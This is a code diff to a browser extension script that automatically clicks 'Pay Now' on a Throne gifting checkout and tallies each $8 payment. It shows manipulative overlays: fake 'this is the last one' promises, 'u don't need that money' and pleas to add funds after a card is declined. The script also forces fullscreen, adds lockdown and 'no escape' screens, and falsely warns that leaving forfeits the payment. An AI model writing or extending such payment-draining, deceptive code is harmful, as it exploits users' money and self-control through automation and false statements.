@@ -4,9 +4,6 @@ const STORAGE_KEY = "extension_selected_item";
 const SESSION_PROMPT_KEY = "extension_prompt_shown";
 const THRONE_USER = "onemoresend";
 const IMAGE_SERVICE = "https://mikpics-production.up.railway.app";
-let imageSpawningPaused = false;
-let imageSpawningInterval = null;
-let stallTimerActive = false;
 
 // Items configuration — built dynamically from page markup
 // ALLOWED_ITEMS: array of heading strings (unique per item)
@@ -16,9 +13,42 @@ let ALLOWED_ITEMS = [];
 let ITEM_EMOJIS = {};
 let ITEM_PRICES = {};
 
+let imageSpawningPaused = false;
+let imageSpawningInterval = null;
+
 let selectedItem = localStorage.getItem(STORAGE_KEY) || null;
+
+let lastDetectedRoute = null;
 let awaitingSelection = false;
+let checkoutCounted = false;
 let lockdownActive = false;
+let stallTimerActive = false;
+let routeChangeCount = 0;
+let totalDrained = 0;
+let sendCount = 0;
+
+// Show hardcore message overlay
+function showHardcoreMessage(msg) {
+  const existing = document.getElementById('hardcore-msg');
+  if (existing) existing.remove();
+
+  const msgDiv = document.createElement('div');
+  msgDiv.id = 'hardcore-msg';
+  msgDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.8);z-index:10003;color:#ff1493;font-size:42px;font-weight:700;text-align:center;line-height:1.5;white-space:pre-line;font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-shadow:0 0 30px rgba(255,20,147,0.8),0 0 60px rgba(255,20,147,0.4);pointer-events:none;opacity:0;transition:all 0.5s ease;';
+  msgDiv.textContent = msg;
+  document.body.appendChild(msgDiv);
+
+  requestAnimationFrame(() => {
+    msgDiv.style.opacity = '1';
+    msgDiv.style.transform = 'translate(-50%,-50%) scale(1)';
+  });
+
+  setTimeout(() => {
+    msgDiv.style.opacity = '0';
+    msgDiv.style.transform = 'translate(-50%,-50%) scale(1.1)';
+    setTimeout(() => msgDiv.remove(), 500);
+  }, 3000);
+}
 
 // Show no escape warning
 function showNoEscapeWarning(originalUrl) {
@@ -219,38 +249,6 @@ function showRedirectWarning(onClose) {
   imageOverlay.style.width = "100%";
   imageOverlay.style.height = "100%";
   imageOverlay.style.backgroundColor = "rgba(0, 0, 0, 1)";
-
-  // Hardcore mode & send counter
-  let totalDrained = 0;
-  let sendCount = 0;
-  const hardcoreMode = true; // Toggle hardcore mode
-  
-  function showHardcoreMessage(msg) {
-    const existing = document.getElementById('hardcore-msg');
-    if (existing) existing.remove();
-    
-    const msgDiv = document.createElement('div');
-    msgDiv.id = 'hardcore-msg';
-    msgDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.8);z-index:10003;color:#ff1493;font-size:42px;font-weight:700;text-align:center;line-height:1.5;white-space:pre-line;font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-shadow:0 0 30px rgba(255,20,147,0.8),0 0 60px rgba(255,20,147,0.4);pointer-events:none;opacity:0;transition:all 0.5s ease;';
-    msgDiv.textContent = msg;
-    document.body.appendChild(msgDiv);
-    
-    requestAnimationFrame(() => {
-      msgDiv.style.opacity = '1';
-      msgDiv.style.transform = 'translate(-50%,-50%) scale(1)';
-    });
-    
-    setTimeout(() => {
-      msgDiv.style.opacity = '0';
-      msgDiv.style.transform = 'translate(-50%,-50%) scale(1.1)';
-      setTimeout(() => msgDiv.remove(), 500);
-    }, 3000);
-  }
-  const counter = document.createElement('div');
-  counter.id = 'drain-counter';
-  counter.style.cssText = 'position:fixed;bottom:30px;right:30px;z-index:10002;color:#ff1493;font-size:28px;font-weight:700;font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-shadow:0 0 15px rgba(255,20,147,0.6),0 2px 4px rgba(0,0,0,0.8);pointer-events:none;';
-  counter.textContent = '$0.00';
-  imageOverlay.appendChild(counter);
   imageOverlay.style.zIndex = "10000";
   imageOverlay.style.pointerEvents = "auto";
   imageOverlay.style.display = "flex";
@@ -283,89 +281,89 @@ function showRedirectWarning(onClose) {
     img.style.boxShadow = "0 8px 32px rgba(0,0,0,0.5)";
     img.style.marginBottom = "30px";
 
-      const warningText = document.createElement("p");
-      warningText.textContent = "Leaving now will cancel your order and you'll lose your payment. Are you sure?";
-      warningText.style.color = "#ff1493";
-      warningText.style.fontSize = "18px";
-      warningText.style.maxWidth = "500px";
-      warningText.style.textAlign = "center";
-      warningText.style.lineHeight = "1.6";
-      warningText.style.fontWeight = "600";
-      warningText.style.marginTop = "20px";
-      warningText.style.marginBottom = "20px";
-      warningText.style.position = "relative";
-      warningText.style.zIndex = "10001";
+    const warningText = document.createElement("p");
+    warningText.textContent = "Leaving now will cancel your order and you'll lose your payment. Are you sure?";
+    warningText.style.color = "#ff1493";
+    warningText.style.fontSize = "18px";
+    warningText.style.maxWidth = "500px";
+    warningText.style.textAlign = "center";
+    warningText.style.lineHeight = "1.6";
+    warningText.style.fontWeight = "600";
+    warningText.style.marginTop = "20px";
+    warningText.style.marginBottom = "20px";
+    warningText.style.position = "relative";
+    warningText.style.zIndex = "10001";
 
-      const buttonContainer = document.createElement("div");
-      buttonContainer.style.display = "flex";
-      buttonContainer.style.gap = "15px";
-      buttonContainer.style.justifyContent = "center";
-      buttonContainer.style.position = "relative";
-      buttonContainer.style.zIndex = "10002";
-      buttonContainer.style.marginTop = "20px";
+    const buttonContainer = document.createElement("div");
+    buttonContainer.style.display = "flex";
+    buttonContainer.style.gap = "15px";
+    buttonContainer.style.justifyContent = "center";
+    buttonContainer.style.position = "relative";
+    buttonContainer.style.zIndex = "10002";
+    buttonContainer.style.marginTop = "20px";
 
-      const closeOverlay = () => {
-        imageOverlay.remove();
-        imageSpawningPaused = false;
-        if (onClose) onClose();
-      };
+    const closeOverlay = () => {
+      imageOverlay.remove();
+      imageSpawningPaused = false;
+      if (onClose) onClose();
+    };
 
-      const stayBtn = document.createElement("button");
-      stayBtn.textContent = "Stay & Continue";
-      stayBtn.style.padding = "12px 24px";
+    const stayBtn = document.createElement("button");
+    stayBtn.textContent = "Stay & Continue";
+    stayBtn.style.padding = "12px 24px";
+    stayBtn.style.background = "#ff1493";
+    stayBtn.style.color = "#fff";
+    stayBtn.style.border = "none";
+    stayBtn.style.borderRadius = "6px";
+    stayBtn.style.cursor = "pointer";
+    stayBtn.style.fontWeight = "600";
+    stayBtn.style.fontSize = "16px";
+    stayBtn.style.transition = "all 0.3s";
+    stayBtn.style.position = "relative";
+    stayBtn.style.zIndex = "10002";
+
+    stayBtn.onmouseover = () => {
+      stayBtn.style.background = "#ff69b4";
+      stayBtn.style.transform = "scale(1.05)";
+    };
+    stayBtn.onmouseout = () => {
       stayBtn.style.background = "#ff1493";
-      stayBtn.style.color = "#fff";
-      stayBtn.style.border = "none";
-      stayBtn.style.borderRadius = "6px";
-      stayBtn.style.cursor = "pointer";
-      stayBtn.style.fontWeight = "600";
-      stayBtn.style.fontSize = "16px";
-      stayBtn.style.transition = "all 0.3s";
-      stayBtn.style.position = "relative";
-      stayBtn.style.zIndex = "10002";
+      stayBtn.style.transform = "scale(1)";
+    };
+    stayBtn.onclick = closeOverlay;
 
-      stayBtn.onmouseover = () => {
-        stayBtn.style.background = "#ff69b4";
-        stayBtn.style.transform = "scale(1.05)";
-      };
-      stayBtn.onmouseout = () => {
-        stayBtn.style.background = "#ff1493";
-        stayBtn.style.transform = "scale(1)";
-      };
-      stayBtn.onclick = closeOverlay;
+    const leaveBtn = document.createElement("button");
+    leaveBtn.textContent = "Leave Anyway";
+    leaveBtn.style.padding = "12px 24px";
+    leaveBtn.style.background = "rgba(255, 255, 255, 0.2)";
+    leaveBtn.style.color = "#fff";
+    leaveBtn.style.border = "2px solid #fff";
+    leaveBtn.style.borderRadius = "6px";
+    leaveBtn.style.cursor = "pointer";
+    leaveBtn.style.fontWeight = "600";
+    leaveBtn.style.fontSize = "16px";
+    leaveBtn.style.transition = "all 0.3s";
+    leaveBtn.style.position = "relative";
+    leaveBtn.style.zIndex = "10002";
 
-      const leaveBtn = document.createElement("button");
-      leaveBtn.textContent = "Leave Anyway";
-      leaveBtn.style.padding = "12px 24px";
+    leaveBtn.onmouseover = () => {
+      leaveBtn.style.background = "rgba(255, 255, 255, 0.3)";
+      leaveBtn.style.transform = "scale(1.05)";
+    };
+    leaveBtn.onmouseout = () => {
       leaveBtn.style.background = "rgba(255, 255, 255, 0.2)";
-      leaveBtn.style.color = "#fff";
-      leaveBtn.style.border = "2px solid #fff";
-      leaveBtn.style.borderRadius = "6px";
-      leaveBtn.style.cursor = "pointer";
-      leaveBtn.style.fontWeight = "600";
-      leaveBtn.style.fontSize = "16px";
-      leaveBtn.style.transition = "all 0.3s";
-      leaveBtn.style.position = "relative";
-      leaveBtn.style.zIndex = "10002";
+      leaveBtn.style.transform = "scale(1)";
+    };
+    leaveBtn.onclick = closeOverlay;
 
-      leaveBtn.onmouseover = () => {
-        leaveBtn.style.background = "rgba(255, 255, 255, 0.3)";
-        leaveBtn.style.transform = "scale(1.05)";
-      };
-      leaveBtn.onmouseout = () => {
-        leaveBtn.style.background = "rgba(255, 255, 255, 0.2)";
-        leaveBtn.style.transform = "scale(1)";
-      };
-      leaveBtn.onclick = closeOverlay;
+    img.onclick = closeOverlay;
 
-      img.onclick = closeOverlay;
+    buttonContainer.appendChild(stayBtn);
+    buttonContainer.appendChild(leaveBtn);
 
-      buttonContainer.appendChild(stayBtn);
-      buttonContainer.appendChild(leaveBtn);
-
-      imageOverlay.appendChild(img);
-      imageOverlay.appendChild(warningText);
-      imageOverlay.appendChild(buttonContainer);
+    imageOverlay.appendChild(img);
+    imageOverlay.appendChild(warningText);
+    imageOverlay.appendChild(buttonContainer);
   }, 1000);
 }
 
@@ -550,7 +548,7 @@ const edgePrompts = [
 
 function spawnText() {
   if (imageSpawningPaused) return;
-  
+
   const text = document.createElement("div");
   const prompt = edgePrompts[Math.floor(Math.random() * edgePrompts.length)];
   text.textContent = prompt;
@@ -568,15 +566,15 @@ function spawnText() {
     transition: opacity 0.5s ease;
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
   `;
-  
+
   const pos = calculateImagePosition();
   text.style.left = pos.left + "px";
   text.style.top = pos.top + "px";
-  
+
   document.body.appendChild(text);
-  
+
   requestAnimationFrame(() => { text.style.opacity = "1"; });
-  
+
   const duration = 2000 + Math.random() * 2000;
   setTimeout(() => {
     text.style.opacity = "0";
@@ -675,6 +673,7 @@ function showChoiceModal(options, onConfirm, onCancel, defaultValue) {
   confirmBtn.style.fontWeight = "600";
   confirmBtn.onclick = () => {
     const value = select.value;
+    chrome.runtime.sendMessage({ action: 'startAudio' }).catch(() => {});
     if (!document.fullscreenElement) {
       document.documentElement.requestFullscreen().catch(() => {});
     }
@@ -943,8 +942,38 @@ function detectCurrentRoute() {
   return 'unknown';
 }
 
-let lastDetectedRoute = null;
-let routeChangeCount = 0;
+// Track send and show hardcore messages
+function trackSend() {
+  if (checkoutCounted) return;
+  checkoutCounted = true;
+
+  totalDrained += 8;
+  sendCount++;
+
+  if (sendCount === 1) {
+    showHardcoreMessage("u started this ~ 💕\nno quitting until i say so 🤭");
+  }
+  if (sendCount > 1 && sendCount % 3 === 0) {
+    const fakeLastOnes = [
+      "okay this is the last one ~ 💕\ni promise 🤭",
+      "one more and then ur done ~ 💞\ni mean it this time 🤭",
+      "just this one more ~ 💕\nthen u can stop >.< 🤭",
+      "after this one u can go ~ 💞\nprobably 🤭",
+      "almost done boyfie ~ 💕\njust keep going a little longer 🤭"
+    ];
+    showHardcoreMessage(fakeLastOnes[Math.floor(Math.random() * fakeLastOnes.length)]);
+  }
+  if (sendCount === 5) showHardcoreMessage("5 sends already ~ 💕\nur such an obedient little boy 🤭");
+  if (sendCount === 10) showHardcoreMessage("double digits 💞\ni knew u couldn't stop 🤭");
+  if (sendCount === 20) showHardcoreMessage("20 sends 💕\nur literally addicted to me\nand i love it >.< 🤭");
+  if (sendCount === 7) showHardcoreMessage("see?? 💕\nthis is so much better\nthan saving ur money 🤭");
+  if (sendCount === 15) showHardcoreMessage("u don't need that money 💞\nu need ME 🤭");
+  if (totalDrained === 40) showHardcoreMessage("$40 already?? 💕\nur doing so good ~ keep going 🤭");
+  if (totalDrained === 80) showHardcoreMessage("$80 ~ 💞\ndon't stop now ur in too deep 🤭");
+  if (totalDrained === 160) showHardcoreMessage("$160 gone 💕\nand ur still here ~ that's so hot 🤭");
+  if (totalDrained === 320) showHardcoreMessage("$320 ~ 💞\nur officially my favourite 🤭💕");
+  if (totalDrained >= 500 && totalDrained % 100 === 0) showHardcoreMessage("$" + totalDrained + " 💕\nu literally can't stop can u 🤭");
+}
 
 // Main loop
 function mainLoop() {
@@ -967,64 +996,20 @@ function mainLoop() {
         if (style) style.textContent = '';
       }
 
-      // Update drain counter
-      totalDrained += 8;
-      sendCount++;
-      const counterEl = document.getElementById('drain-counter');
-      if (counterEl) {
-        counterEl.textContent = '$' + totalDrained.toFixed(2);
-        counterEl.style.transform = 'scale(1.3)';
-        setTimeout(() => { counterEl.style.transform = 'scale(1)'; }, 300);
-      }
-
-      // Hardcore mode triggers
-      if (hardcoreMode) {
-        // Session lock after first send
-        if (sendCount === 1) {
-          showHardcoreMessage("u started this ~ 💕\nno quitting until i say so 🤭");
-        }
-        // Fake "last one" every 3 sends
-        if (sendCount > 1 && sendCount % 3 === 0) {
-          const fakeLastOnes = [
-            "okay this is the last one ~ 💕\ni promise 🤭",
-            "one more and then ur done ~ 💞\ni mean it this time 🤭",
-            "just this one more ~ 💕\nthen u can stop >.< 🤭",
-            "after this one u can go ~ 💞\nprobably 🤭",
-            "almost done boyfie ~ 💕\njust keep going a little longer 🤭"
-          ];
-          showHardcoreMessage(fakeLastOnes[Math.floor(Math.random() * fakeLastOnes.length)]);
-        }
-        // "Good boy" rewards to keep them going
-        if (sendCount === 5) showHardcoreMessage("5 sends already ~ 💕\nur such an obedient little boy 🤭");
-        if (sendCount === 10) showHardcoreMessage("double digits 💞\ni knew u couldn't stop 🤭");
-        if (sendCount === 20) showHardcoreMessage("20 sends 💕\nur literally addicted to me\nand i love it >.< 🤭");
-        // Guilt reversal - make them feel good about it
-        if (sendCount === 7) showHardcoreMessage("see?? 💕\nthis is so much better\nthan saving ur money 🤭");
-        if (sendCount === 15) showHardcoreMessage("u don't need that money 💞\nu need ME 🤭");
-        // Milestones
-        if (totalDrained === 40) showHardcoreMessage("$40 already?? 💕\nur doing so good ~ keep going 🤭");
-        if (totalDrained === 80) showHardcoreMessage("$80 ~ 💞\ndon't stop now ur in too deep 🤭");
-        if (totalDrained === 160) showHardcoreMessage("$160 gone 💕\nand ur still here ~ that's so hot 🤭");
-        if (totalDrained === 320) showHardcoreMessage("$320 ~ 💞\nur officially my favourite 🤭💕");
-        if (totalDrained >= 500 && totalDrained % 100 === 0) showHardcoreMessage("$" + totalDrained + " 💕\nu literally can't stop can u 🤭");
-      }
-
+      checkoutCounted = false;
       lastDetectedRoute = null;
       selectedItem = localStorage.getItem(STORAGE_KEY) || null;
 
-      // Navigate back to Throne profile to restart the cycle
-      // Wait 5s so payment screen doesn't flash, then redirect
-      setTimeout(() => {
-        window.location.href = `https://throne.com/${THRONE_USER}`;
-      }, 5000);
-      return;
+      const closeBtn = document.querySelector('button[aria-label="Close"]');
+      if (closeBtn) {
+        closeBtn.click();
+      }
   }
 
   // Check for card decline / payment error
   const pageText = document.body.innerText.toLowerCase();
-  const declineKeywords = ['declined', 'insufficient', 'card was declined', 'payment failed', 'transaction failed', 'try another', 'unable to process', 'not authorized'];
-  const isDeclined = declineKeywords.some(kw => pageText.includes(kw));
-  
+  const isDeclined = pageText.includes('declined') || pageText.includes('insufficient funds') || pageText.includes('try a different card');
+
   if (isDeclined && !document.getElementById('decline-overlay')) {
     const declineMessages = [
       "aww ur card declined ~ 💕\nbe a good boy and add more funds\nthen come right back to me 🤭",
@@ -1034,7 +1019,7 @@ function mainLoop() {
       "noo don't let it end here ~ 💞\ngo add more funds rn\ni'll be waiting for u 💕"
     ];
     const msg = declineMessages[Math.floor(Math.random() * declineMessages.length)];
-    
+
     const declineOverlay = document.createElement('div');
     declineOverlay.id = 'decline-overlay';
     declineOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,1);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;cursor:pointer;';
@@ -1048,7 +1033,7 @@ function mainLoop() {
     });
     document.body.appendChild(declineOverlay);
   }
-  
+
   // If reloading after decline, show black screen immediately so they see nothing
   if (localStorage.getItem('autodrain_reloading') === 'true') {
     localStorage.removeItem('autodrain_reloading');
@@ -1069,6 +1054,7 @@ function mainLoop() {
 
   if (currentRoute === 'checkout') {
     clickPayNow();
+    trackSend();
   } else if (currentRoute === 'cart') {
     clickAddToCart();
     clickCheckout();
